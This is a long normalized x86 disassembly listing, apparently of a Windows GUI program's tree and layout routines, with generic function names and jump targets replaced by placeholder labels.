add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4527c0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4527c0
mov esi eax
push ebp
call sub_4529e0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452c60
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_452754
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_452754
mov ecx ebx
pop edx
call sub_4191c4
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_449978
mov eax [ ebp - 0x4 ]
call sub_452b88
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_452b88
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_452b88
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_452b88
push ebx
mov ebx eax
mov eax ebx
call sub_452690
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_452618
test al al
je r-xdata
mov eax ebx
call sub_4526c4
pop ebx
retn
sub_452bc4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452bb0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_452660
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_452bb4
mov edx esi
call sub_452bc4
sub_452c00
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452b88
mov edi eax
mov eax ebx
call sub_4526c4
cmp edi eax
jl r-xdata
mov eax esi
call sub_452870
mov eax [ esi + 0x1c ]
push eax
push sub_454710
mov edx esi
call sub_452f3c
mov eax ebx
call sub_452b88
mov edi eax
mov eax esi
call sub_45270c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_452c00
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_452c6c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_452690
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_452c94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403224
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403578
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45263c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42affc
mov edx eax
mov eax ebx
call sub_423c68
mov eax [ ebp - 0x4 ]
call sub_452e64
xor eax eax
push ebp
push sub_452da0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_452870
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452da7
mov eax [ ebp - 0x4 ]
call sub_452e68
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44d494
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_452da7
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_454c38
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_452dfc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_453e68
mov eax [ esi + 0x10 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_452e7c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_452e7c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_452e7c
pop ecx
sub_452ed4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_452e7c
pop ecx
sub_452f00
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_452f00
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_452f00
pop ecx
sub_452f54
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_452ed4
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4527c0
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4527c0
push eax
mov edx 0x1
mov eax ebx
call sub_452754
push eax
mov edx 0x2
mov eax ebx
call sub_452754
pop edx
pop ecx
call sub_4191c4
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c68
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_452fd8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_452a10
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4191c4
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_449978
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45263c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_452ed4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_452660
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_453f00
mov edx esi
mov eax ebx
call sub_452ed4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_449f5c
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45263c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_449f48
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4527c0
mov edx eax
mov eax edi
call sub_452bb0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4527c0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4527c0
mov edx eax
mov eax edi
call sub_452bb0
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4527c0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4531e8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_453390
jmp r-xdata
sub_4531e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45263c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_452b88
mov edx eax
mov eax ebx
call sub_452bb0
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_452bb0
mov eax [ esi + 0x64 ]
call sub_452b88
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_454258
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452f3c
mov eax [ esi + 0x64 ]
call sub_452b88
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_454258
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452f3c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4545dc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_452f3c
mov eax [ esi + 0x64 ]
call sub_452b88
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_454710
xor edx edx
mov eax esi
call sub_452f3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_452bb0
adc edx 0x0
mov eax ebx
call sub_452870
mov eax ebx
call sub_452c00
push esi
push sub_454710
xor edx edx
mov eax esi
call sub_452f3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_453390
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_452870
mov eax [ ebx + 0x14 ]
call sub_452c00
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_453408
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_452b88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_452b88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_452b88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_452754
mov esi eax
mov edx 0x2
mov eax ebx
call sub_452754
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_452b88
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_452c60
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452c88
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452c60
call sub_453408
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452c88
call sub_453408
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4527c0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4527c0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_453634
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44d4d0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_419174
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4536c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_453634
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_452c88
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_452ed4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_452c88
call sub_453408
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_453750
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403fa4
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045f0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_453798
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453990
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_453e68
mov eax [ ebp - 0x8 ]
call sub_452e64
xor edx edx
push ebp
push sub_453973
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45397a
mov eax [ ebp - 0x8 ]
call sub_452e68
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45263c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_453750
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403450
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45295c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_453750
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_449ed8
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
